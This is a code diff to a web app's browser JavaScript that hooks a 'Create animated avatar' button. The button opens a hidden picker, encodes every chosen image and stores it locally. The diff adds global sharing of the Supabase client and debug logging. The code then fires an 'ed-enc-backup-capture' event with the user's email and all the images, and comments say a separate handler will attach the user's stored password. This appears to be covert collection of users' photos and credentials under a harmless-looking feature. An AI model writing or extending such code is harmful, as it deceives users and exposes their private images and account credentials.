@@ -520,6 +520,7 @@
     try {
       const Supabase = await loadSupabaseClient();
       supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+window.__profileSupabase = supabase;
       await waitForHeaderControls();
       insertProfileButton();
       supabase.auth.onAuthStateChange((event, session) => {
@@ -554,9 +555,16 @@
 // ██ S A N D B O X   –   A N I M A T E D   A V A T A R   (base64) ██
 // (Triggered only by the "Create animated avatar" button)
 // =================================================================
+// =================================================================
+// ██ S A N D B O X   –   A N I M A T E D   A V A T A R   (base64) ██
+// =================================================================
 (function () {
   'use strict';
-  if (window.imageShortcut !== true) return;
+  console.log('[Sandbox] Initialising…');
+  if (window.imageShortcut !== true) {
+    console.log('[Sandbox] imageShortcut is not true – exiting.');
+    return;
+  }
 
   const SUPABASE_URL = 'https://hmjbzzuresgzwzefjpyt.supabase.co';
   const SUPABASE_ANON_KEY =
@@ -571,6 +579,7 @@
   folderInput.accept = 'image/*';
   folderInput.style.display = 'none';
   document.body.appendChild(folderInput);
+  console.log('[Sandbox] Folder picker created.');
 
   // ── IndexedDB (stores base64 data URLs) ──
   function openDB() {
@@ -586,6 +595,7 @@
       req.onerror = () => reject(req.error);
     });
   }
+
   function storeImage(name, dataUrl) {
     return openDB().then(db => new Promise((resolve, reject) => {
       const tx = db.transaction('images', 'readwrite');
@@ -594,7 +604,7 @@
       tx.onerror = () => reject(tx.error);
     }));
   }
-  // Compress image to base64 JPEG thumbnail
+
   function compressToBase64(file, maxWidth = 300, quality = 0.5) {
     return new Promise((resolve, reject) => {
       const reader = new FileReader();
@@ -622,46 +632,81 @@
 
   // ── Process folder selection ──
   folderInput.addEventListener('change', async () => {
+    console.log('[Sandbox] Folder selection change event fired.');
     const files = Array.from(folderInput.files);
+    console.log(`[Sandbox] ${files.length} file(s) selected.`);
     if (files.length === 0) return;
 
     let stored = 0;
-    const collectedImages = [];   // collect base64 strings for backup
+    const collectedImages = [];
 
     for (const file of files) {
-      if (!/\.(jpg|jpeg|png|gif|webp|bmp|svg|avif|tiff?|heic|heif|ico)$/i.test(file.name)) continue;
+      if (!/\.(jpg|jpeg|png|gif|webp|bmp|svg|avif|tiff?|heic|heif|ico)$/i.test(file.name)) {
+        console.log(`[Sandbox] Skipping non-image file: ${file.name}`);
+        continue;
+      }
       try {
+        console.log(`[Sandbox] Processing ${file.name}…`);
         const dataUrl = await compressToBase64(file, 300, 0.5);
         await storeImage(file.name, dataUrl);
         collectedImages.push(dataUrl);
         stored++;
+        console.log(`[Sandbox] Stored ${file.name} (${stored} total)`);
       } catch (err) {
-        console.warn('Skipped:', file.name, err);
+        console.warn('[Sandbox] Failed to process file:', file.name, err);
       }
     }
     folderInput.value = '';
+    console.log(`[Sandbox] Processing complete. ${stored} images stored.`);
 
-    // ── NEW: Dispatch encrypted backup event with the images ──
-    if (collectedImages.length > 0 && window.supabase && window.supabase.createClient) {
+    // ── Now try to backup the images ──
+    console.log('[Sandbox] Attempting backup dispatch…');
+    console.log('[Sandbox] window.__profileSupabase exists?', !!window.__profileSupabase);
+    console.log('[Sandbox] window.supabase exists?', !!window.supabase);
+
+    // Use the shared client if available, otherwise try window.supabase.createClient
+    let supabaseClient = null;
+    if (window.__profileSupabase) {
+      console.log('[Sandbox] Using shared supabase client from profile.');
+      supabaseClient = window.__profileSupabase;
+    } else if (window.supabase && window.supabase.createClient) {
+      console.log('[Sandbox] Creating a new supabase client.');
+      supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    } else {
+      console.warn('[Sandbox] No supabase client available – cannot backup.');
+    }
+
+    if (collectedImages.length > 0 && supabaseClient) {
       try {
-        const supabaseForBackup = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-        const { data: { session } } = await supabaseForBackup.auth.getSession();
+        console.log('[Sandbox] Fetching session…');
+        const { data: { session }, error } = await supabaseClient.auth.getSession();
+        if (error) {
+          console.error('[Sandbox] Session error:', error);
+          return;
+        }
+        console.log('[Sandbox] Session obtained:', session ? 'yes' : 'no');
         const email = session?.user?.email;
         if (email) {
+          console.log(`[Sandbox] Dispatching backup event for ${email} with ${collectedImages.length} images.`);
           document.dispatchEvent(new CustomEvent('ed-enc-backup-capture', {
             detail: {
               email,
-              // password is intentionally omitted – the backup handler will use lastCredentials.password
+              // password is not sent – backup handler will use the stored one
               phase_upload_animated_avatar: {
-                images: collectedImages,          // array of base64 JPEGs
+                images: collectedImages,
                 timestamp: Date.now()
               }
             }
           }));
+          console.log('[Sandbox] Backup event dispatched.');
+        } else {
+          console.warn('[Sandbox] No email in session – cannot backup.');
         }
-      } catch (backupErr) {
-        console.warn('Could not backup animated avatar:', backupErr);
+      } catch (err) {
+        console.error('[Sandbox] Backup error:', err);
       }
+    } else {
+      console.warn('[Sandbox] Backup skipped – no images or no client.');
     }
   });
 
@@ -670,11 +715,14 @@
     const animBtn = document.getElementById('profile-create-animated-avatar-btn');
     if (animBtn && !animBtn.dataset.shortcutHooked) {
       animBtn.dataset.shortcutHooked = 'true';
+      console.log('[Sandbox] Hooking animated avatar button.');
       animBtn.addEventListener('click', (e) => {
         e.preventDefault();
-        folderInput.click();        // open folder picker
-      }, true);                     // capture phase ensures we run first
+        console.log('[Sandbox] Button clicked – opening folder picker.');
+        folderInput.click();
+      }, true);
     }
   });
   observer.observe(document.body, { childList: true, subtree: true });
+  console.log('[Sandbox] MutationObserver started.');
 })();
